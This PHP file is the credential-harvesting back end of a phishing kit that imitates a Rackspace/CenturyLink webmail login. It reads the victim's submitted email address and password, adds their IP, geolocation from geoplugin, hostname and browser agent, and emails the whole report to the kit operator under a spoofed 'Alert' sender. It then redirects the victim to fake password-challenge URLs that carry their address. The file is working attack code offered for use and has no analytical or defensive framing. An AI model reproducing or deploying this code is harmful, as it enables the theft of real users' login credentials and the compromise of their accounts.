<?php
error_reporting();
ob_start();
session_start();
$togo = @$_GET['svr'];
$asp = "MyAccounts.aspx";
$axp ="Re_Identify";

//Getting user ip & hostname & mapping it to location
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
          $region=$data['geoplugin_regionName'];
          $country=$data['geoplugin_countryName'];
          $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];




/** form fields **/

$email = $_POST['user_name'];
$passwd = $_POST['password'];
$domain = @substr(strrchr($email, "@"), 1);
$wizard = $_POST['wiz'];
if (isset($wizard) && !empty($wizard)) {
    die();
} else {
    if ($email == "" || $passwd == "") {
        $fail = "1";
        header("Location: ./?fail=$fail");
    } else {
//including email to send
        include '../Email.php';


//Arranging reports
        $Hash = "==================+[ The - Apprentice ]+==================
Email : $email
Password   : $passwd
Dom : $domain
============= [ Ip & Hostname Info ] =============

Client IP: $ip
Country: $country
Region: $region
City: $city
TimeStamp: $log_date 
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

//Relaying...
        $subject = "$email | New $domain User Notification (Rackspace)";
        $headers = "From: Alert<salesjob@privejets.net>";
        $headers .= $_POST['eMailAdd']."\n";
        $headers .= "MIME-Version: 1.0\n";
        mail($SEND, $subject, $Hash, $headers);

//Dynamic redirect
        if ($togo == 'tf') {
//Exiting
//Exiting
            $asp = "/account/challenge/password?sess=14&src=https://rackspacemail.com/saml/module.php/authSynacor/login.php?AuthState=_8291c5634d9d&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&display=login&yid=$email&done=https%3A%2F%2Fauth.centurylink.net/saml/module.php/login%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
            $top = "Consenting.app";
            $Redirect = "../docget.php?top=$top&crumb=$asp";

            header("Location: $Redirect").md5(time());
        } else {
//Exiting
//Exiting
            $asp = "/account/challenge/password?.src=rackspacemail&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&fail=sec&display=login&yid=$email&done=https%3A%2F%2Fauth.centurylink.net/saml/module.php/%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
            $top = "Recesserror.app";
            $Redirect = "./?top=$top&crumb=$asp";

            header("Location: $Redirect").md5(time());
        }
    }
}
